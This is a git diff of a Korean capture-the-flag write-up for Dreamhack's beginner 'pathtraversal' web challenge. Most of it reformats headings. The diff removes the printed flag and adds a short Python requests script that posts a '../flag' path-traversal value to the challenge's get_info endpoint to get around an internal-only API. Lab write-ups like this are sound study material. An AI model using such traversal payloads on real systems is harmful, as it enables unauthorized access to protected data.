@@ -7,25 +7,27 @@ tags: [dreamhack , WebHacking]
 math: true
 ---
 
-## 문제 특징
+# 문제 특징
 
 > Querystring과 request라이브러리를 이용한 해킹
 
-### **난이도**: Lv.Beginner
-### **카테고리**: 웹해킹
+
+## **문제 이름**: pathtraversal
+## **난이도**: Lv.Beginner
+## **카테고리**: 웹해킹
 
 ---
 
-## 문제 구조
+# 문제 구조
 
-### 문제파일구성
+## 문제파일구성
 
 ```
 /
 └── app.py
 ```
 
-### 주요 코드
+## 주요 코드
 
 ```python
 
@@ -106,9 +108,9 @@ application = app #app.run(host='0.0.0.0', port=8000)
 
 `/api/flag`에 플래그 키가 존재하나, `@internal_api` 함수에 의해 로컬 환경에서만 접속이 가능하도록 제한이 되어 있어 단순히 `/api/flag` 주소로 접속하여 플래그를 얻어낼 수 없다.
 
-## 풀이
+# 풀이
 
-### 쿼리 스트링과 requests.get() 함수 활용하기
+## 쿼리 스트링과 requests.get() 함수 활용하기
 
 ```python
 @app.route('/get_info', methods=['GET', 'POST'])
@@ -135,9 +137,12 @@ print(r.text)
 
 해당 요청을 전송하면 `get_info.html`파일 속에 플래그가 함께 담겨 나오게 된다.
 
-## 정답
+# 정답
 
-DH{8a33bb6fe0a37522bdc8adb65116b2d4}
+```python
+import requests
 
-
-
+url = "http://<서버주소>/get_info"
+r = requests.post(url, data={"userid": "../flag"})
+print(r.text)
+```
